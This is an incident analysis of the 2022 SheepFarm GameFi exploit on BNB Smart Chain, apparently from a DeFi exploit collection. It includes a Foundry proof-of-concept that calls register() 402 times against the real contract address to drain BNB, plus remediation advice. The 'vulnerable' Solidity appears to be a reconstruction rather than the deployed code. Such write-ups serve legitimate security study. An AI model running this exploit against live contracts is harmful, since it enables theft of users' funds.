# SheepFarm — register() Repeated Registration Logic Error Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2022-11 |
| **Protocol** | SheepFarm |
| **Chain** | Binance Smart Chain (BSC) |
| **Loss** | Unconfirmed |
| **SheepFarm** | [0x4726010da871f4b57b5031E3EA48Bde961F122aA](https://bscscan.com/address/0x4726010da871f4b57b5031E3EA48Bde961F122aA) |
| **Neighbor** | [0x14598f3a9f3042097486DC58C65780Daf3e3acFB](https://bscscan.com/address/0x14598f3a9f3042097486DC58C65780Daf3e3acFB) |
| **Root Cause** | The `register()` function lacked duplicate registration prevention, allowing repeated registration with the same address and distorting reward calculations |
| **CWE** | CWE-840: Business Logic Error |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-11/SheepFarm2_exp.sol) |

---
## 1. Vulnerability Overview

SheepFarm is a GameFi protocol where users deposit BNB to upgrade virtual villages and earn BNB rewards. The `register(address neighbor)` function registers new users while including logic that affects the reward calculations for the `neighbor` address. With no duplicate registration prevention, registering 400+ times with the same address caused internal state (gems, village level, etc.) to accumulate abnormally. This was exploited to construct a high-level village with a small amount of BNB (0.0005 BNB) and withdraw a disproportionate amount of BNB via `sellVillage()` + `withdrawMoney()`.

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable register() - no duplicate registration prevention
contract SheepFarm {
    mapping(address => User) public users;

    struct User {
        uint256 gems;
        uint256 villages;
        address neighbor;
        bool registered;
    }

    // ❌ No registered check - same address can register repeatedly
    function register(address neighbor) external {
        // ❌ Missing: require(!users[msg.sender].registered, "Already registered");
        users[msg.sender].neighbor = neighbor;
        // Internal state update related to neighbor
        // Repeated calls cause abnormal accumulation of gems/village state
        users[neighbor].gems += referralBonus;
    }

    function addGems() external payable {
        require(msg.value >= minGems);
        users[msg.sender].gems += msg.value / gemPrice;
    }

    function upgradeVillage(uint256 villageId) external {
        uint256 cost = villageCost[villageId];
        require(users[msg.sender].gems >= cost);
        users[msg.sender].gems -= cost;
        users[msg.sender].villages |= (1 << villageId);
    }

    function sellVillage() external {
        // BNB payout based on held village level
        uint256 payout = _calculatePayout(users[msg.sender].villages);
        users[msg.sender].villages = 0;
        payable(msg.sender).transfer(payout);
    }

    function withdrawMoney(uint256 amount) external {
        require(users[msg.sender].gems >= amount);
        users[msg.sender].gems -= amount;
        payable(msg.sender).transfer(amount * gemPrice);
    }
}

// ✅ Correct pattern - duplicate registration prevention
contract SafeSheepFarm {
    function register(address neighbor) external {
        // ✅ Already registered addresses cannot re-register
        require(!users[msg.sender].registered, "Already registered");
        users[msg.sender].registered = true;
        users[msg.sender].neighbor = neighbor;
        users[neighbor].gems += referralBonus;
    }
}
```

---
### On-chain Original Code

Source: Bytecode decompiled


**SheepFarm_decompiled.sol** — Entry point:
```solidity
// ❌ Root cause: The `register()` function lacks duplicate registration prevention, allowing repeated registration with the same address and distorting reward calculations
    function register(address arg0) external {}  // 0x4420e486  // ❌ Vulnerability
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
    │
    ├─[1] Deploy AttackContract (0.0005 BNB)
    │
    ├─[2] Call register(neighbor) × 402 times
    │       ❌ No duplicate registration prevention
    │       Each registration causes abnormal accumulation of internal gems/state
    │
    ├─[3] Call addGems() (0.0005 BNB)
    │       Acquire gems
    │
    ├─[4] Call upgradeVillage() × 5 (sequential)
    │       Construct high-level village using abnormally accumulated gems
    │
    ├─[5] Call sellVillage()
    │       High-level village → receive excess BNB
    │
    ├─[6] Call withdrawMoney(156_000)
    │       Withdraw additional BNB using abnormal gems balance
    │
    ├─[7] selfdestruct → funds returned to original caller
    │
    └─[8] Net profit: large BNB gain relative to 0.0005 BNB input
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

interface ISheepFarm {
    function register(address neighbor) external;
    function addGems() external payable;
    function upgradeVillage(uint256 villageId) external;
    function sellVillage() external;
    function withdrawMoney(uint256 amount) external;
}

// Attack contract - deployed via CREATE, then executes the attack
contract SheepFarmAttack {
    ISheepFarm farm;
    address owner;

    constructor(address _farm) payable {
        farm = ISheepFarm(_farm);
        owner = msg.sender;
    }

    function attack(address neighbor) external {
        // [Step 2] Register 402 times with the same neighbor
        // ⚡ No duplicate registration prevention → abnormal internal state accumulation
        for (uint256 i = 0; i < 402; i++) {
            farm.register(neighbor);
        }

        // [Step 3] Add gems
        farm.addGems{value: 0.0005 ether}();

        // [Step 4] Sequential village upgrades (5 levels)
        for (uint256 i = 0; i < 5; i++) {
            farm.upgradeVillage(i);
        }

        // [Step 5] Sell village → receive excess BNB
        farm.sellVillage();

        // [Step 6] Withdraw additional BNB using abnormal gems
        farm.withdrawMoney(156_000);

        // [Step 7] Transfer profits to original caller
        selfdestruct(payable(owner));
    }

    receive() external payable {}
}

contract SheepFarmExploit is Test {
    ISheepFarm farm = ISheepFarm(0x4726010da871f4b57b5031E3EA48Bde961F122aA);
    address neighbor = 0x14598f3a9f3042097486DC58C65780Daf3e3acFB;

    function setUp() public {
        vm.createSelectFork("bsc", 23_088_156);
    }

    function testExploit() public {
        emit log_named_decimal_uint("[Start] BNB", address(this).balance, 18);

        // Deploy attack contract (0.0005 BNB)
        SheepFarmAttack attackContract = new SheepFarmAttack{value: 0.0005 ether}(address(farm));
        attackContract.attack(neighbor);

        emit log_named_decimal_uint("[End] BNB", address(this).balance, 18);
    }

    receive() external payable {}
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Missing duplicate registration prevention in register() → reward calculation distortion |
| **CWE** | CWE-840: Business Logic Error |
| **OWASP DeFi** | GameFi reward manipulation |
| **Attack Vector** | `register(neighbor)` × 402 → `addGems()` → `upgradeVillage()` × 5 → `sellVillage()` → `withdrawMoney()` |
| **Preconditions** | No duplicate registration prevention (`registered` flag) in `register()` function |
| **Impact** | Large-scale BNB withdrawal from a small BNB investment |

---
## 6. Remediation Recommendations

1. **Duplicate Registration Prevention**: Add `require(!users[msg.sender].registered, "Already registered")` and `users[msg.sender].registered = true` to the `register()` function.
2. **State Initialization Validation**: Explicitly verify state before registration to ensure prior state is not left uninitialized or allowed to accumulate upon re-registration.
3. **GameFi Economic Model Audit**: GameFi protocols whose reward calculations depend on accumulated state require invariant tests that explicitly track all state-change paths.

---
## 7. Lessons Learned

- **Weak State Management in GameFi**: DeFi protocols combining game elements (registration, upgrades, sales) connect each function to economic incentives, meaning logic errors translate directly into immediate fund losses.
- **Duplicate Registration as a Basic Defense**: In on-chain registration systems, the `registered` flag is the most fundamental defense mechanism. Omitting it makes all cumulative reward logic exploitable through repeated calls.
- **Asymmetry of Small-Scale Attacks**: The attack enabled withdrawal of many times the initial investment starting from just 0.0005 BNB. GameFi protocols need economic safeguards that cap the input-to-output ratio.